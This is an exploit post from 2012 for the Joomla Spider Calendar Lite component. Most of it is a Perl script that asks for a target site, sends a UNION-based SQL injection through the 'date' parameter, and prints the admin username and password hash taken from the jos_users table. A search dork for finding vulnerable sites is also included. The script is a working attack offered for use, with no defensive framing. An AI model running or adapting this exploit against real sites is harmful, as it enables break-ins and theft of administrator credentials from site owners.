 Exploit Title: Joomla spider calendar lite Remote Exploit

 dork: inurl:com_spidercalendar
 
 Date: [29-08-2012]
 
 Author: Daniel Barragan "D4NB4R"
 
 Twitter: @D4NB4R
 
 site: http://poisonsecurity.wordpress.com/
 
 Vendor: http://web-dorado.com/products/spider-calendar-lite.html
 
 Version: Last 
 
 License: Non-Commercial

 Download: http://web-dorado.com/products/spider-calendar-lite.html
  
 Tested on: [Linux(bt5)-Windows(7ultimate)]

 Especial greetz:  _84kur10_, dedalo, nav


Descripcion: 

Spider Calendar Lite is a highly configurable Joomla extension which allows you to have multiple organized events in a calendar. You can create as many events as you need for a day. With a simple click on the date you will see the events and their descriptions recorded for that day. 

Exploit: 


    #!/usr/bin/perl -w
    # Joomla Component (spidercalendar) Remote SQL Exploit
    #----------------------------------------------------------------------------#

    ########################################
    print "\t\t\n\n";
print "\t\n";
print "\t            Daniel Barragan  D4NB4R                \n";
print "\t                                                   \n";
print "\t      Joomla com_spidercalendar Remote Sql Exploit \n";
print "\t\n\n";

use LWP::UserAgent;
print "\nIngrese el Sitio:[http://wwww.site.com/path/]: ";

chomp(my $target=<STDIN>);

    #the username of  joomla
    $user="username";
    #the pasword of  joomla
    $pass="password";
    #the tables of joomla
    $table="jos_users";
    $d4n="null";
    ########################################
    #----------------------------------------------------------------------------#
    ########################################
    $b = LWP::UserAgent->new() or die "Could not initialize browser\n";
    $b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
    ########################################
    #----------------------------------------------------------------------------#
    ########################################
    $host = $target . "index.php?option=com_spidercalendar&date=999999.9' union all select ".$d4n."%2Cnull%2Cconcat(0x3c757365723e,".$user.",0x3c757365723e3c706173733e,".$pass.",0x3c706173733e)%2Cnull%2Cnull%2Cnull from ".$table."+--+ D4NB4R";
    $res = $b->request(HTTP::Request->new(GET=>$host));
    $answer = $res->content;
    ########################################
    #----------------------------------------------------------------------------#
    ########################################
    if ($answer =~ /<user>(.*?)<user>/){
            print "\nLos Datos Extraidos son:\n";
      print "\n
     
* Admin User : $1";
     
    }
    ########################################
    #----------------------------------------------------------------------------#
    ########################################
    if ($answer =~/<pass>(.*?)<pass>/){print "\n
     
* Admin Hash : $1\n\n";
     
    print "\t\t#   El Exploit aporto usuario y password   #\n\n";}
    else{print "\n[-] Exploit Failed...\n";}
    ########################################
    #-------------------Exploit exploited by D4NB4R --------------------#
    ########################################

        


  
_____________________________________________________
Daniel Barragan "D4NB4R" 2012